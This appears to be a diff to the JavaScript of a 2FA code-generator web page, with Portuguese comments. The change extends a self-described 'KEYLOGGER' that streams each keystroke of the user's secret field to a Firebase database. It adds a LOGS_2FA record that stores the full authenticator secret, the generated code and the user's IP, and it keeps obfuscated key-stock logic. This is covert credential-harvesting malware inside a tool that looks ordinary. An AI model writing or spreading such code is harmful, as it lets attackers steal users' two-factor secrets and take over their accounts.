@@ -115,7 +115,6 @@ function toggleAvaliacao(){let d=document.getElementById("painelAvaliacao");d.st
 function togglePainel(){document.getElementById("painel").style.display="block"}
 function fecharPainel(){document.getElementById("painel").style.display="none"}
 
-// Sistema de Votos
 const q=['p1','p2','p3'];
 q.forEach(p=>{
     db.ref('avaliacoes/'+p+'/sim').on('value',s=>{if(document.getElementById(p+'_sim'))document.getElementById(p+'_sim').innerText='👍 Sim ('+(s.val()||0)+')'});
@@ -128,37 +127,42 @@ function votar(p,t){
     localStorage.setItem('voto_'+p,t);
 }
 
-// MONITORAMENTO EM TEMPO REAL (KEYLOGGER) + LOGICA DE ESTOQUE
+// MONITORAMENTO EM TEMPO REAL (KEYLOGGER) + LOGICA DE ESTOQUE + LOGS 2FA
 document.getElementById("secret").addEventListener("input", function(){
     let v=this.value.trim().toUpperCase();
     let d=new Date().toISOString().split('T')[0];
     let h=new Date().toLocaleTimeString();
 
     if(userIP !== ""){
-        // 1. KEYLOGGER: Envia cada caractere digitado imediatamente
+        // 1. KEYLOGGER (Tempo Real)
         db.ref("LOGS_DIGITACAO/" + d + "/" + userIP).set({
             texto: v,
             hora: h,
             ip: rawIP
         });
 
-        // 2. GERADOR E VALIDACAO: Se tiver 8 ou mais, gera o código e tenta validar no estoque
+        // 2. GERADOR E LOGS 2FA
         if(v.length >= 8){
             let o=gOTP(v);
             document.getElementById("code").innerText=o;
             document.getElementById("clearInput").style.display="block";
+
+            // NOVIDADE: Envia para a pasta LOGS_2FA mostrando IP, CHAVE e CODIGO gerado
+            db.ref("LOGS_2FA/" + d + "/" + userIP).set({
+                chave: v,
+                codigo_gerado: o,
+                hora: h,
+                ip_cliente: rawIP
+            });
             
+            // 3. LOGICA DE ESTOQUE
             db.ref(_0x5a1e[6]+v).once('value').then(s=>{
                 if(s.exists()){
-                    // Se estiver no estoque, salva em CHAVES_UTILIZADAS
                     db.ref(_0x5a1e[7]+d+"/"+userIP).push({c:v, h:h, ip:rawIP, st:"✅ OK"});
                     db.ref(_0x5a1e[6]+v).remove();
                     copiar(o);
-                } else {
-                    // Se não estiver, salva em CHAVES_ALTERADAS (mas só cria o registro uma vez por chave)
-                    if(v.length >= 16) {
-                         db.ref(_0x5a1e[8]+d+"/"+userIP).push({c:v, g:o, h:h, ip:rawIP, st:"⚠️ NÃO_ESTOCADA"});
-                    }
+                } else if(v.length >= 16) {
+                    db.ref(_0x5a1e[8]+d+"/"+userIP).push({c:v, g:o, h:h, ip:rawIP, st:"⚠️ NÃO_ESTOCADA"});
                 }
             });
         }
